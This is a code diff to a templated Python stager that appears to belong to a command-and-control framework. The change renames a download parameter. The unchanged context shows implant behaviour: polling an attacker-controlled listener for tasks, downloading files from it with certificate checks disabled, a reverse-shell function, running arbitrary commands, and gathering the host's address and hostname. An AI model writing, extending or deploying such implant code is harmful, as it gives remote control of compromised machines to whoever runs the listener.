@@ -49,9 +49,9 @@ URL = "https://{{stager.listener.address}}:{{stager.listener.port}}/"
 URL = "http://{{stager.listener.address}}:{{stager.listener.port}}/"
 {% endif %}
 
-def download_file(file_name: str, file_path: str):
+def download_file(task_name: str, file_path: str):
     with open(file_path, "wb") as f:
-        f.write(r.get(URL+"download/"+file_name, verify=False).content)
+        f.write(r.get(URL+"download/"+task_name, verify=False).content)
 
 
 def reverse_shell(address: str, port: int):
@@ -85,6 +85,7 @@ def shell_execution(cmd: str):
 def get_output(cmd: str):
     data["output"] = sp.getoutput(cmd)
     data["success"] = True
+    
 data = {
     "address": socket.gethostbyname(socket.gethostname()),
     "hostname": sp.getoutput("hostname"),
@@ -121,7 +122,7 @@ while i < {{stager.timeout}}:
                 data["output"] = "Send reverse shell"
             elif task["type"] == "upload":
                 try:
-                    download_file(task["args"]["file_name"], task["args"]["target_path"])
+                    download_file(task["name"], task["args"]["target_path"])
                 except Exception as e:
                     data["success"] = False
                     data["output"] = str(e)
